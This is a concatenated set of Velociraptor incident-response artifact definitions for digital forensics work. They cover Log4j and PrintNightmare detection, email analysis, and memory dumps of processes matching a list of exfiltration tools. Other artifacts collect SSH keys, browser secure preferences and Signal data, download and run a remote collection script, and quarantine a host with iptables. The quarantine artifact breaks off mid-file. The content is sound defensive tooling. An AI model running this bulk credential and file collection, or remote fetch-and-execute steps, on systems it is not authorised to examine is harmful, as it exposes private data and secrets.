        log4j-core-2.14.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,77323460255818f4cbfe180141d6001bfb575b429e00a07cbceabd59adf334d6,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,"2.14.0, 2.14.1",CVE-2021-44228," 10.0"
        log4j-core-2.15.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,db07ef1ea174e000b379732681bd835cfede648a7971bf4e9a0d31981582d69e,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,2.15.0,CVE-2021-45046," 9.0"
        log4j-core-2.16.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,5210e6aae7dd8a61cd16c56937c5f2ed43941487830f46e99d0d3f45bfa6f953,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,2.16.0,CVE-2021-45105," 7.5"
        log4j-core-2.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,ae950f9435c0ef3373d4030e7eff175ee11044e584b7f205b7a9804bbe795f9c,org/apache/logging/log4j/core/lookup/JndiLookup.class,a768e5383990b512f9d4f97217eda94031c2fa4aea122585f5a475ab99dc7307,"2.1.0, 2.2.0, 2.3.0",CVE-2021-44228," 10.0"
        log4j-core-2.3.jar,org/apache/logging/log4j/core/net/JndiManager.class,ae950f9435c0ef3373d4030e7eff175ee11044e584b7f205b7a9804bbe795f9c,org/apache/logging/log4j/core/lookup/JndiLookup.class,a768e5383990b512f9d4f97217eda94031c2fa4aea122585f5a475ab99dc7307,"2.1.0, 2.2.0, 2.3.0",CVE-2021-44228," 10.0"
        log4j-core-2.4.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,3bff6b3011112c0b5139a5c3aa5e698ab1531a2f130e86f9e4262dd6018916d7,org/apache/logging/log4j/core/lookup/JndiLookup.class,a534961bbfce93966496f86c9314f46939fd082bb89986b48b7430c3bea903f7,"2.4.0, 2.4.1, 2.5.0",CVE-2021-44228," 10.0"
        log4j-core-2.4.jar,org/apache/logging/log4j/core/net/JndiManager.class,3bff6b3011112c0b5139a5c3aa5e698ab1531a2f130e86f9e4262dd6018916d7,org/apache/logging/log4j/core/lookup/JndiLookup.class,a534961bbfce93966496f86c9314f46939fd082bb89986b48b7430c3bea903f7,"2.4.0, 2.4.1, 2.5.0",CVE-2021-44228," 10.0"
        log4j-core-2.5.jar,org/apache/logging/log4j/core/net/JndiManager.class,3bff6b3011112c0b5139a5c3aa5e698ab1531a2f130e86f9e4262dd6018916d7,org/apache/logging/log4j/core/lookup/JndiLookup.class,a534961bbfce93966496f86c9314f46939fd082bb89986b48b7430c3bea903f7,"2.4.0, 2.4.1, 2.5.0",CVE-2021-44228," 10.0"
        log4j-core-2.6.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,6540d5695ddac8b0a343c2e91d58316cfdbfdc5b99c6f3f91bc381bc6f748246,org/apache/logging/log4j/core/lookup/JndiLookup.class,e8ffed196e04f81b015f847d4ec61f22f6731c11b5a21b1cfc45ccbc58b8ea45,"2.6.0, 2.6.1, 2.6.2",CVE-2021-44228," 10.0"
        log4j-core-2.6.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,6540d5695ddac8b0a343c2e91d58316cfdbfdc5b99c6f3f91bc381bc6f748246,org/apache/logging/log4j/core/lookup/JndiLookup.class,e8ffed196e04f81b015f847d4ec61f22f6731c11b5a21b1cfc45ccbc58b8ea45,"2.6.0, 2.6.1, 2.6.2",CVE-2021-44228," 10.0"
        log4j-core-2.6.jar,org/apache/logging/log4j/core/net/JndiManager.class,6540d5695ddac8b0a343c2e91d58316cfdbfdc5b99c6f3f91bc381bc6f748246,org/apache/logging/log4j/core/lookup/JndiLookup.class,e8ffed196e04f81b015f847d4ec61f22f6731c11b5a21b1cfc45ccbc58b8ea45,"2.6.0, 2.6.1, 2.6.2",CVE-2021-44228," 10.0"
        log4j-core-2.7.jar,org/apache/logging/log4j/core/net/JndiManager.class,1584b839cfceb33a372bb9e6f704dcea9701fa810a9ba1ad3961615a5b998c32,org/apache/logging/log4j/core/lookup/JndiLookup.class,cee2305065bb61d434cdb45cfdaa46e7da148e5c6a7678d56f3e3dc8d7073eae,"2.7.0, 2.8.0, 2.8.1",CVE-2021-44228," 10.0"
        log4j-core-2.8.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,1584b839cfceb33a372bb9e6f704dcea9701fa810a9ba1ad3961615a5b998c32,org/apache/logging/log4j/core/lookup/JndiLookup.class,66c89e2d5ae674641138858b571e65824df6873abb1677f7b2ef5c0dd4dbc442,"2.7.0, 2.8.0, 2.8.1",CVE-2021-44228," 10.0"
        log4j-core-2.8.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,764b06686dbe06e3d5f6d15891250ab04073a0d1c357d114b7365c70fa8a7407,org/apache/logging/log4j/core/lookup/JndiLookup.class,d4ec57440cd6db6eaf6bcb6b197f1cbaf5a3e26253d59578d51db307357cbf15,2.8.2,CVE-2021-44228," 10.0"
        log4j-core-2.8.jar,org/apache/logging/log4j/core/net/JndiManager.class,1584b839cfceb33a372bb9e6f704dcea9701fa810a9ba1ad3961615a5b998c32,org/apache/logging/log4j/core/lookup/JndiLookup.class,66c89e2d5ae674641138858b571e65824df6873abb1677f7b2ef5c0dd4dbc442,"2.7.0, 2.8.0, 2.8.1",CVE-2021-44228," 10.0"
        log4j-core-2.9.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.9.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"

sources:
  - query: |
      -- this section searches by filename and hashes hits
      LET target_files = SELECT * 
        FROM if(condition=version(plugin='glob') >= 2,
            then={ SELECT * FROM glob(globs=TargetGlob,recursion_callback='x=>x.IsLink OR x.Data.DevMajor = NULL OR x.Data.DevMajor > 7') },
            else={ SELECT * FROM glob(globs=TargetGlob,nosymlink=True) })

      -- recursive search function
      LET Recurse(File, OriginalFile, Container, RecursionRounds) = SELECT * FROM foreach(
                row={
                    SELECT *
                    FROM glob(accessor="zip", root=url(path=File, scheme="file"), globs="/**")
                    WHERE NOT IsDir AND Size > 0
                },
                query={
                    SELECT *
                      FROM if(condition=Name =~ ".(jar|war|ear)$",
                            then={
                                SELECT * FROM Recurse(
                                    OriginalFile=OriginalFile + "/" + url(parse=FullPath).Fragment,
                                    File=copy(dest=tempfile(extension=".zip", remove_last=TRUE),
                                        accessor="zip", filename=FullPath),
                                    Container=Container, RecursionRounds = RecursionRounds + 1)
                                WHERE RecursionRounds < MaxRecursions

                            },
                            else={
                              SELECT * FROM switch(
                                path={
                                    SELECT Container,
                                        'Path detection' as Description,
                                        Name, url(parse=FullPath).Fragment AS ZipPath, OriginalFile,
                                        hash(path=FullPath,accessor='zip').SHA256 as SHA256h
                                    FROM scope()
                                    WHERE ZipPath in IocLookupTable.FilePath
                                        OR basename(path=ZipPath) in IocLookupTable.JarName
                                        OR basename(path=Container) in IocLookupTable.JarName
                                },
                                hash={
                                    SELECT Container,
                                        'Hash detection' as Description,
                                        Name, url(parse=FullPath).Fragment AS ZipPath, OriginalFile, Size,
                                        hash(path=FullPath,accessor='zip').SHA256 as SHA256h
                                    FROM scope()
                                    WHERE SHA256h in IocLookupTable.SHA256
                                        OR SHA256h in IocLookupTable.JndiSHA256

                                })
                            })
                    })

      -- CVE lookup
      LET find_cve(hash,originalfile) = if(condition= hash in IocLookupTable.SHA256,
                then= {
                    SELECT Version,Cve,Severity
                    FROM IocLookupTable
                    WHERE SHA256 = hash
                    GROUP BY Version,Cve,Severity
                },
            else= if(condition= basename(path=originalfile) in IocLookupTable.JarName,
                then= {
                    SELECT Version,Cve,Severity
                    FROM IocLookupTable
                    WHERE basename(path=originalfile) = JarName
                    GROUP BY Version,Cve,Severity
                }))[0]

      -- find hits
      LET hits <= SELECT
                Container as FullPath,
                if(condition= Container=OriginalFile,
                    then= Null,
                    else= OriginalFile ) as Embedded,
                if(condition= Description=~ 'Hash',
                    then= format(format='%s: %s',args=[Description, SHA256h]),
                else= if(condition= basename(path=Container) in IocLookupTable.JarName,
                    then = format(format='%s: %s',args=[Description, Container]),
                else= if(condition= basename(path=OriginalFile) in IocLookupTable.JarName,
                    then = format(format='%s: %s',args=[Description, OriginalFile]),
                else= format(format='%s: %s',args=[Description, ZipPath])
                    ))) as Description,
                CVEDetails.Version as Log4jVersion,
                CVEDetails.Cve as CVE,
                CVEDetails.Severity as Severity
        FROM foreach(row=target_files,
            query={
                SELECT *,
                    find_cve(hash=SHA256h,originalfile=OriginalFile) as CVEDetails
                FROM Recurse(File=FullPath, OriginalFile=FullPath,Container=FullPath,RecursionRounds=0)
                WHERE CVEDetails
                LIMIT 1
            })

      -- upload files that have hits
      LET upload_hits=SELECT *,
            upload(file=FullPath) AS Upload
        FROM hits

      -- return rows
      SELECT * FROM if(condition=UploadHits,
        then=upload_hits,
        else=hits)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.Sublime.EmailAnalysis.yaml
======
name: Server.Enrichment.Sublime.EmailAnalysis
author: Wes Lambert -- @therealwlambert, @weslambert@infosec.exchange
description: |
  Submit an email to Sublime for analysis.
  
  https://sublime.security/
  
  By default, this artifact returns matches for active detection rules.

  This artifact can be called from within another artifact (such as one looking for files) to enrich the data made available by that artifact.

  Ex.

    `SELECT * from Artifact.Server.Enrichment.Sublime(Message=$YourBase64EncodedMessage)`

type: SERVER

parameters:
    - name: Message
      type: string
      description: The message to submit to Sublime.
      default:

    - name: SublimeKey
      type: string
      description: API key for Sublime. Leave blank here if using server metadata store.
      default:
      
sources:
  - query: |
        LET Creds = if(
           condition=SublimeKey,
           then=SublimeKey,
           else=server_metadata().SublimeKey)

        LET URL <= 'https://api.platform.sublimesecurity.com/v0/messages/analyze'
        
        LET Response = SELECT parse_json(data=Content) AS Content
            FROM http_client(
                    url=URL,
                    headers=dict(`Authorization`=format(format="Bearer %v", args=[Creds]), `Content-Type`="application/json"),
                    data=serialize(item=dict(`raw_message`=Message, `run_active_detection_rules`=true)),
                    method='POST')

        LET ResultsQuery = SELECT * FROM foreach(
            row=Response, 
            query={
                SELECT 
                    rule.name AS Name, 
                    rule.source AS Source, 
                    rule.id AS ID, success AS Success, 
                    error AS Error, 
                    execution_time AS ExecutionTime
                FROM Content.rule_results WHERE matched = true
            }
        )
        
        SELECT * FROM foreach(
            row=if(condition=Response.Content.rule_results, 
                   then=ResultsQuery, 
                   else=Response.Content))

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Triage.HighValueMemory.yaml
======
name: Windows.Triage.HighValueMemory

description: |
  Dump process memory and upload to the server

  Common Archive Utilities: Winrar, Winzip, 7-zip, Winscp, FileZilla

  Common Exfil Utilities: robocopy, rclone, mega*

  Consoles: cmd, powershell

author: "@kevinfosec - liteman"

parameters:
  - name: processRegexCsv
    default: |
      processName
      mega
      winrar
      winzip
      7z
      winscp
      filezilla
      robocopy
      rclone
      notepad
      cmd
      powershell
    type: regex

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |

      LET processRegexList <= SELECT processName
                              FROM parse_csv(filename=processRegexCsv, accessor='data')

      LET processes(processRegex) = SELECT Name as ProcessName,
                                          CommandLine,
                                          Pid
                                    FROM pslist()
                                    WHERE Name =~ processRegex

      LET processList = SELECT *
                        FROM foreach(
                                row=processRegexList,
                                query={ SELECT * from processes(processRegex=processName) }
                        )

      SELECT *
      FROM foreach(
              row=processList,
              query={
                  SELECT ProcessName,
                         CommandLine,
                         Pid,
                         FullPath,
                         upload(file=FullPath,
                                name=format(format="%v_%v",args=[ProcessName,Pid])) as CrashDump
                  FROM proc_dump(pid=Pid)
              }
            )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Sysinternals.Sysmon.yaml
======
name: Linux.Sysinternals.Sysmon
author: Wes Lambert -- @therealwlambert
description: |
  Parses syslog for Sysmon events on Linux

  **Reference**: https://github.com/Sysinternals/SysmonForLinux

  This artifact can also be modified to forward events (as a client
  event artifact), similar to Windows.Sysinternals.SysmonLogForward.

type: CLIENT

precondition: SELECT OS From info() where OS = 'linux'

parameters:
  - name: syslogPath
    default: /var/log/syslog

  - name: sysmonGrok
    description: A Grok expression for parsing Sysmon events from syslog on Linux machines
    default: >-
      %{SYSLOGTIMESTAMP:Timestamp} (?:%{SYSLOGFACILITY} )?%{SYSLOGHOST:logsource} %{SYSLOGPROG}: %{GREEDYDATA:event}
  - name: StartDate
    type: timestamp
    description: "Parse events on or after this date (YYYY-MM-DDTmm:hh:ssZ)"
  - name: EndDate
    type: timestamp
    description: "Parse events on or before this date (YYYY-MM-DDTmm:hh:ssZ)"
  - name: IDRegex
    default: "."
  - name: EventDataRegex
    description: "IOC Filter to reduce results"
    default: "."
  - name: ParentUserRegex
    description: "User filter by parent user for process artefacts"
    default: "."
    

sources:
  - queries:
      # Basic syslog parsing via GROK expressions.
      - LET UnparsedEvents = SELECT * FROM foreach(
          row={
              SELECT *  FROM glob(globs=syslogPath)
          }, query={
              SELECT grok(grok=sysmonGrok, data=Line) AS Event,
              OSPath
              FROM parse_lines(filename=OSPath)
              WHERE Event.program = "sysmon" AND Event.event =~ "<Event>"
          })
      - LET ParsedEvents = SELECT parse_xml(accessor='data', file=Event.event).Event AS Event FROM UnparsedEvents
      - SELECT timestamp(string=Event.System.TimeCreated.AttrSystemTime) AS TimeCreated,
           Event.System.EventID AS EventID,
           Event.System.Channel AS _Channel,
           Event.System.EventRecordID AS EventRecordID,
           Event.System.EventID AS EventID,
           Event.System.Computer AS Computer,
           Event.System AS System,
           to_dict(item={SELECT AttrName AS _key, `#text` AS _value FROM Event.EventData.Data}) AS EventData
         FROM ParsedEvents
         WHERE
            if(condition=StartDate, then=TimeCreated >= timestamp(string=StartDate), else=true)
            AND if(condition=EndDate, then=TimeCreated <= timestamp(string=EndDate), else=true)
            AND str(str=EventID) =~ IDRegex
            AND EventData =~ EventDataRegex
            AND EventData.ParentUser =~ ParentUserRegex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.UserConfig.yaml
======
name: Linux.Collection.UserConfig
author: alternate
description: |
  Collect user configurations and upload them.
  Based on TriageUserConfiguration from forensicartifacts.com

reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/data/triage.yaml

precondition: SELECT OS FROM info() WHERE OS = 'linux'

parameters:
- name: BashShellConfigurationFile
  default: |
    ["/{root,home/*}/.bash_logout","/{root,home/*}/.bash_profile","/{root,home/*}/.bashrc",
     "/etc/bash.bashrc","/etc/bashrc"]

- name: ChromePreferences
  default: |
    ["/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/Preferences",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-config/google-chrome/*/Secure Preferences",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/Preferences",
     "/{root,home/*}/.config/chrome-remote-desktop/chrome-profile/*/Secure Preferences",
     "/{root,home/*}/.config/chromium/*/Preferences",
     "/{root,home/*}/.config/chromium/*/Secure Preferences",
     "/{root,home/*}/.config/google-chrome/*/Preferences",
     "/{root,home/*}/.config/google-chrome/*/Secure Preferences"]

- name: CShellConfigurationFile
  default: |
    ["/{root,home/*}/.cshrc","/etc/csh.cshrc","/etc/csh.login","/etc/csh.logout"]

- name: FishShellConfigurationFile
  default: |
    ["/{root,home/*}/.local/share/fish/fish_history",
     "/{root,home/*}/.config/fish/conf.d/config.fish",
     "/{root,home/*}/.config/fish/config.fish",
     "/etc/fish/config.fish,/etc/fish/conf.d/*.fish"]

- name: JupyterConfigFile
  default: /{root,home/*}/.jupyter/jupyter_notebook_config.py

- name: KornShellConfigurationFile
  default: |
    ["/{root,home/*}/.ksh","/etc/kshrc"]

- name: RHostsFile
  default: /{root,home/*}/.rhosts

- name: ShellLogoutFile
  default: /{root,home/*}/.logout

- name: ShellProfileFile
  default: | 
    ["/{root,home/*}/.profile","/etc/profile"]

- name: SignalApplicationContent
  default: |
    ["/{root,home/*}/.var/app/org.signal.Signal/*/attachments.noindex/*",
     "/{root,home/*}/.var/app/org.signal.Signal/*/Cache/*",
     "/{root,home/*}/.var/app/org.signal.Signal/*/logs/*",
     "/{root,home/*}/.var/app/org.signal.Signal/config.json"]

- name: SSHAuthorizedKeysFiles
  default: |
    ["/{root,home/*}/.ssh/authorized_keys","/{root,home/*}/.ssh/authorized_keys2"]

- name: SSHKnownHostsFiles
  default: | 
    ["/{root,home/*}/.ssh/known_hosts","/etc/ssh/known_hosts"]

- name: SSHUserConfigFile
  default: /{root,home/*}/.ssh/config

- name: TeeShellConfigurationFile
  default: /{root,home/*}/.tcsh

- name: ZShellConfigurationFile
  default: |
    ["/{root,home/*}/.zlogin","/{root,home/*}/.zlogout","/{root,home/*}/.zprofile",
     "/etc/zshenv,/etc/zshrc","/etc/zsh/zlogin","/etc/zsh/zlogout","/etc/zsh/zprofile",
     "/etc/zsh/zshenv","/etc/zsh/zshrc"]

sources:
- name: uploadBashShellConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=BashShellConfigurationFile))

- name: uploadChromePreferences
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=ChromePreferences))

- name: uploadCShellConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=CShellConfigurationFile))

- name: uploadFishShellConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=FishShellConfigurationFile))

- name: uploadJupyterConfigFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=JupyterConfigFile)

- name: uploadKornShellConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=KornShellConfigurationFile))

- name: uploadRHostsFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=RHostsFile)

- name: uploadShellLogoutFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=ShellLogoutFile)

- name: uploadShellProfileFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=ShellProfileFile))

- name: uploadSignalApplicationContent
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=SignalApplicationContent))

- name: uploadSSHAuthorizedKeysFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=SSHAuthorizedKeysFiles))

- name: uploadSSHKnownHostsFiles
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=SSHKnownHostsFiles))

- name: uploadSSHUserConfigFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=SSHUserConfigFile)

- name: uploadTeeShellConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=TeeShellConfigurationFile)

- name: uploadZShellConfigurationFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=ZShellConfigurationFile))

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.CatScale.yaml
======
name: Linux.Collection.CatScale
author: Wes Lambert -- @therealwlambert
description: |
    This is a simple artifact that leverages Cat-Scale to collect many
    different artifacts from a Linux host, then uploads the results to
    the Velociraptor server.

    From the project's description:

    "Linux CatScale is a bash script that uses live of the land tools
    to collect extensive data from Linux based hosts. The data aims to
    help DFIR professionals triage and scope incidents. An Elk Stack
    instance also is configured to consume the output and assist the
    analysis process."

    https://github.com/FSecureLABS/LinuxCatScale

    https://labs.f-secure.com/tools/cat-scale-linux-incident-response-collection/

tools:
  - name: CatScale
    url: https://raw.githubusercontent.com/FSecureLABS/LinuxCatScale/master/Cat-Scale.sh
    serve_locally: true
parameters:
  - name: Outfile
    default: collection
    type: string
    description: Name of resultant collection file (will have `.tar.gz` appended)
  - name: OutfilePrefix
    default: catscale_
    type: string
    description: Prefix of collection file (Ex. catscale_ -- useful for parsing the filename later or other identification purposes)
  - name: OutDir
    default: catscale_out
    type: string
    description: Staging directory (modification likely not needed in most cases)
precondition: SELECT OS From info() where OS = 'linux'
sources:
  - query: |
        LET CS <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="CatScale", IsExecutable=TRUE)
        LET TmpDir <= tempdir(remove_last=TRUE)
        Let RunIt = SELECT *, TmpDir + '/' + OutfilePrefix + Outfile + '.tar.gz' AS TarFile
                    FROM execve(argv=[
                        CS.FullPath[0],
                        "-d", OutDir,
                        "-o", TmpDir,
                        "-f", Outfile,
                        "-p", OutfilePrefix
                     ])
        SELECT upload(accessor="file", file=TarFile) AS Upload FROM RunIt

---END OF FILE---

======
FILE: /content/exchange/artifacts/PrintNightmare.yaml
======
name: Windows.Detection.PrintNightmare
author: "Matt Green - @mgreen27"
description: |
  This artifact returns any binaries in the Windows/spool/drivers/**
  folders with an untrusted Authenticode entry.

  It can be used to hunt for dll files droped during exploitation of
  CVE-2021-1675 - PrintNightmare.

  To query all attached ntfs drives: check the AllDrives switch.

  I have added several filters to uplift search capabilities from the
  original MFT artifact. Due to the multi-drive features, the MFTPath
  will output the MFT path of the entry.

  Available filters include:
  - FullPath regex
  - FileName regex
  - Time bounds to select files with a timestamp within time ranges
  - FileSize bounds

  ![Sample output](https://github.com/mgreen27/velociraptor-docs/raw/patch-5/content/exchange/artifacts/PrintNightmare.png)

parameters:
  - name: MFTFilename
    default: "C:/$MFT"
  - name: Accessor
    default: ntfs
    type: hidden
  - name: PathRegex
    description: "Regex search over FullPath."
    default: Windows/System32/spool/drivers
  - name: FileRegex
    description: "Regex search over File Name"
    default: .
  - name: AllAuthenticode
    type: bool
    description: "Show all binaries despite Authenticode trusted status (default shows only untrusted)."
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: SizeMax
    type: int64
    description: "Entries in the MFT under this size in bytes."
  - name: SizeMin
    type: int64
    description: "Entries in the MFT over this size in bytes."
  - name: AllDrives
    type: bool
    description: "Select MFT search on all attached ntfs drives."


sources:
  - query: |
      -- time testing
      LET time_test(stamp) =
            if(condition= DateBefore AND DateAfter,
                then= stamp < DateBefore AND stamp > DateAfter,
                else=
            if(condition=DateBefore,
                then= stamp < DateBefore,
                else=
            if(condition= DateAfter,
                then= stamp > DateAfter,
                else= True
            )))


      -- find all ntfs drives
      LET ntfs_drives = SELECT FullPath + '/$MFT'as Path
        FROM glob(globs="/*", accessor="ntfs")


      -- function returning MFT entries
      LET mftsearch(MFTPath) = SELECT
            split(sep='\\$',string=MFTPath)[0] + FullPath as FullPath,
            InUse,FileName,FileSize,
            dict(
                Created0x10 = Created0x10,
                LastModified0x10 = LastModified0x10,
                LastRecordChange0x10 = LastRecordChange0x10,
                LastAccess0x10 = LastAccess0x10
                ) as SI,
            dict(
                Created0x30 = Created0x10,
                LastModified0x30 = LastModified0x10,
                LastRecordChange0x30 = LastRecordChange0x10,
                LastAccess0x30 = LastAccess0x10
                ) as FN
        FROM parse_mft(filename=MFTPath, accessor=Accessor)
        WHERE NOT IsDir
            AND FullPath =~ PathRegex
            AND FileName =~ FileRegex
            AND if(condition=SizeMax,
                then=FileSize < atoi(string=SizeMax),
                else=TRUE)
            AND if(condition=SizeMin,
                then=FileSize > atoi(string=SizeMin),
                else=TRUE)
            AND
             ( time_test(stamp=Created0x10)
            OR time_test(stamp=Created0x30)
            OR time_test(stamp=LastModified0x10)
            OR time_test(stamp=LastModified0x30)
            OR time_test(stamp=LastRecordChange0x10)
            OR time_test(stamp=LastRecordChange0x30)
            OR time_test(stamp=LastAccess0x10)
            OR time_test(stamp=LastAccess0x30))


      -- include all attached drives
      LET all_drives = SELECT * FROM foreach(row=ntfs_drives,
            query={
                SELECT *
                FROM mftsearch(MFTPath=Path)
                WHERE log(message="Processing " + Path)
              })


      -- return rows
      SELECT *,
            parse_pe(file=FullPath) as PE,
            authenticode(filename=FullPath) as Authenticode,
            hash(path=FullPath) as Hash
      FROM if(condition=AllDrives,
        then= all_drives,
        else= {
           SELECT * FROM mftsearch(MFTPath=MFTFilename)
        })
      WHERE PE
        AND if(condition=AllAuthenticode,
            then=TRUE,
            else= NOT Authenticode.Trusted = 'trusted')

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Remediation.Quarantine.yaml
======
name: Linux.Remediation.Quarantine.IPTables
description: |
   Quarantine a Linux host using iptables rules.

   NOTE: This is still a work in progress and may not work exactly as expected.  Only use this artifact in a TEST environment/lab. It has been tested against Ubuntu hosts with iptables enabled.

   NOTE: There is now a built in Linux.Remediation.Quarantine which works a bit better

type: CLIENT
author: Wes Lambert -- @therealwlambert

parameters:
  - name: RemovePolicy
    type: bool
    description: Tickbox to remove policy.
  - name: NotificationMessage
    description: |
        Optional notification to send to logged in users.

sources:
  - query: |

      // Get domain, port, and Frontends for VR, like we do in the Windows Quarantine artifact (H/T @mgreen27)
      LET get_domain(URL) = parse_string_with_regex(string=URL, regex='^https?://(?P<Domain>[^:/]+)').Domain

      LET get_port(URL) = if(condition= URL=~"https://[^:]+/", then="443",else=if(condition= URL=~"http://[^:]+/", then="80",else=parse_string_with_regex(string=URL,
                  regex='^https?://[^:/]+(:(?P<Port>[0-9]*))?/').Port))

      LET Frontends <= SELECT VRAddr, VRPort FROM foreach(row=config.server_urls, query={
                           SELECT
                               get_domain(URL=_value) AS VRAddr,
                               get_port(URL=_value) AS VRPort
                           FROM scope()
                       })

      LET RemoveOldSavedRules = SELECT * FROM execve(argv=["bash", "-c", "rm", "-f", "/root/original-rules"])

      LET RestoreOldRules = SELECT * FROM chain(
                                a={SELECT log(message="Removing quarantine policy...") FROM scope()},
                                b={SELECT * FROM execve(argv=["iptables-restore", "/root/original-rules"])},
                                c={SELECT * FROM execve(argv=["rm", "-f", "/root/original-rules"])}
                            )

      LET IptablesExists <= SELECT ReturnCode FROM execve(argv=["ls","/usr/sbin/iptables"]) WHERE ReturnCode = 0

      LET RuleBackupDoesntExist = SELECT ReturnCode FROM execve(argv=["ls","/root/original-rules"]) WHERE ReturnCode = 2

      LET SaveCurrentRules = SELECT * FROM execve(argv=["iptables-save", "-f", "/root/original-rules"])

      LET RuleBackup = if(condition=RuleBackupDoesntExist, then=SaveCurrentRules, else=log(message="Rule backup already exists!"))

      LET ZenityExists = SELECT ReturnCode FROM execve(argv=["ls","/usr/bin/zenity"]) WHERE ReturnCode = 0

      LET ZenityCommand = SELECT * FROM execve(argv=["zenity", "--info", "--title", "ALERT", "--text", NotificationMessage])

      LET WallExists = SELECT ReturnCode FROM execve(argv=["ls","/usr/bin/wall"]) WHERE ReturnCode = 0

      LET WallCommand = SELECT * FROM execve(argv=["wall", "-n", NotificationMessage])

      LET XMessageExists = SELECT ReturnCode FROM execve(argv=["ls","/usr/bin/xmessage"]) WHERE ReturnCode = 0

      LET XMessageCommand = SELECT * FROM execve(argv=["xmessage", NotificationMessage])

      LET Display = SELECT ReturnCode FROM execve(argv=["xhost"]) WHERE ReturnCode = 0

      LET NotifyCommand = SELECT * FROM
                            if(condition=Display,
                                then={SELECT * FROM
                                    if(condition=ZenityExists,
                                        then=ZenityCommand,
                                        else=if(condition=XMessageExists,
                                            then=XMessageCommand
                                        )
                                    )
                                },
                                else={ SELECT * FROM
                                    if(condition=WallExists,
                                        then=WallCommand,
                                        else={ SELECT log(message="Unable to perform notification, as not suitable applications were found.") FROM scope() })
                                    }
                            )

      LET NotifyUsers = SELECT * FROM if(condition=NotificationMessage,then=NotifyCommand)

      LET RemoveQuarantine = SELECT *, timestamp(epoch=now()) as Time FROM RestoreOldRules

      LET InputAllow = SELECT *  from foreach(row=Frontends, query={ SELECT * FROM execve(argv=['iptables', '-A', 'INPUT', '-s', VRAddr, '-j', 'ACCEPT'])})

      LET ForwardAllow = SELECT * from foreach(row=Frontends, query={ SELECT * FROM execve(argv=['iptables', '-A', 'FORWARD', '-s', VRAddr, '-j', 'ACCEPT'])})

      LET OutputAllow = SELECT * from foreach(row=Frontends, query={ SELECT * FROM execve(argv=['iptables', '-A', 'OUTPUT', '-p', 'tcp', '-d', VRAddr, '--dport', VRPort, '-j', 'ACCEPT'])})

      LET InputDrop = SELECT * FROM execve(argv=['iptables', '-P', 'INPUT', 'DROP'])

